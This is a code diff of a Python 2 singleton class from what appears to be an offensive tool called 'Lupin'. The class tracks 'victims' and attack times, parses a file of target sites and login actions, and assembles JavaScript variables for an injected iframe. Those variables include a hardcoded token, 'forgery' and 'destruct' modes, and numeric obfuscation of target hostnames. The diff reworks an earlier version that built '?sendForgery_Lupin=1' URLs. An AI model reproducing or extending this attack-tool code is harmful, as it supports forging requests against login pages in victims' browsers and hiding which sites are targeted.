@@ -5,58 +5,47 @@ class PersistentData:
     _instance = None
 
     def __init__(self):
-        self.dnsCache        = {}
-        self.loginAction     = self.mapLoginActions()
-	self.slaveVariables  = ""        
-	self.lastAttackTime  = {}
-        self.victims         = []
-	self.shutDown        = False
-        self.sleepInterval   = -1
-	self.limitRefresh    = -1
-
-    def setSleepInterval(self, interval):
-	self.sleepInterval = interval
-	  
-    def setLimitRefresh(self, limit):
-	self.limitRefresh = limit      
+        self._LUPIN_TOKEN      	= "qaz123xsw654edc789rfv"
+        self._FRAME				= 'm'
+        self._FORGERY			= 'f'
+        self._BOUNTY			= 'b'
+        self._DESTRUCT			= 'd'
+        self._404				= -1
+        self._LUPIN				= 0
+        self._PROXY				= 1
+        self.dnsCache        	= {}
+        self.lastAttackTime  	= {}
+        self.victims         	= []
+        self.loginActions    	= {}
+        self.masterIframeVars	= ""
 
     def addDnsCache(self, host, address):
         self.dnsCache[host] = address
+        
 
-    def mapLoginActions(self):
-	try:
-		targetSites = open("targetSites.txt")
-	except:
-		self.shutDown = True
-		return -1
-
-	actions = {}
-	for filelineno, line in enumerate(targetSites):
-	    cr = line.find("\r")
-            if cr != -1:
-                line = line[:cr]
-	    nl = line.find("\n")
-	    if nl != -1:
-                line = line[:nl]
+    def setLoginActions(self,targets_fd):
+	
+        targets_fd.seek(0,0)
+        for filelineno, line in enumerate(targets_fd):
+            if "\n" in line:
+                line = line[:-1]
                 
             host_action = line.split("|")
-	    if len(host_action) != 2:
-	       print "ERROR: targetSites.txt line "+str(filelineno)+": "+line
-	    else:
-	    	if host_action[0].startswith("http://"):
-                	host_action[0] = host_action[0][7:]
+            if len(host_action) != 2:
+                print "ERROR: targets line "+str(filelineno)+": "+line
+            else:
+                if host_action[0].startswith("http://"):
+                    host_action[0] = host_action[0][7:]
 
-		slash = host_action[0].find('/')
-		if slash != -1:
-			host_action[0] = host_action[0][:slash]
-	    
-            	actions[host_action[0]] = "'"+host_action[1]+"'"
-	targetSites.close()
-	return actions
+                slash = host_action[0].find('/')
+                if slash != -1:
+                    host_action[0] = host_action[0][:slash]
+            
+                self.loginActions[host_action[0]] = "'"+host_action[1]+"'"
 
 
     def setLastAttackTime(self, client):
-	self.lastAttackTime[client] = time.time()
+        self.lastAttackTime[client] = time.time()
 
   
     def addVictim(self, client):
@@ -65,32 +54,30 @@ class PersistentData:
 
     def oldVictim(self, client):
         if client in self.victims:
-		return True
-	return False
+            return True
+        return False
 
 
-    def setSlaveVariables(self, refresh, sleep):
-	self.slaveVariables = "var targets=["
-	targetSites = open("targetSites.txt")
+    def setMasterIframeVars(self,sleepDuration,targets_fd,runWhileInFocus, nibble, obfuscateTargets):
+        self.masterIframeVars = "var _LUPIN_TOKEN=\""+self._LUPIN_TOKEN+"\"; var _FORGERY =\""+self._FORGERY+"\" ;var _DESTRUCT =\""+self._DESTRUCT+"\" ;var targetsObfuscated="+obfuscateTargets+"; var runWhileInFocus="+runWhileInFocus+"; var nibble="+nibble+"; var sleepDuration ="+str(sleepDuration)+";var targets=["
+        targets_fd.seek(0,0)
+        for filelineno,line in enumerate(targets_fd):
+            if '\n' in line:
+                line = line[:-1]
+                
+            if line.startswith("http://"):
+                line= line[7:]
 
-	for filelineno,line in enumerate(targetSites):
-            cr = line.find("\r")
-            if cr != -1:
-                line = line[:cr]
-	    nl = line.find("\n")
-	    if nl != -1:
-                line = line[:nl]
             host = line.split("|")[0]
-            if host.startswith("http://"):
-               host = host[7:]
-              
-            self.slaveVariables+="\"http://"+host+"?sendForgery_Lupin=1\"," 
-            #self.slaveVariables+="\""+self.obfuscate("http://"+host+"?sendForgery_Lupin=1")+"\","
-            
-        self.slaveVariables = self.slaveVariables[:-1] + "];var limitRefresh = "+str(refresh)+";var sleepInterval = "+str(sleep)+";"
 
-        targetSites.close() 
-	
+            if obfuscateTargets == "true":
+                self.masterIframeVars += "\""+self.obfuscate(host)+"\","
+                
+            else:
+                self.masterIframeVars += "\""+host+'\",' 
+            	
+        self.masterIframeVars = self.masterIframeVars[:-1] + "];"
+
 
  
     def obfuscate(self,host):
@@ -99,13 +86,13 @@ class PersistentData:
             obfs+=str(ord(letter)+255)+"."
         return obfs[:-1]
 
-
-
+    
+    
     def getInstance():
         if PersistentData._instance == None:
             PersistentData._instance = PersistentData()
-
         return PersistentData._instance
+        
 
     getInstance = staticmethod(getInstance)
 
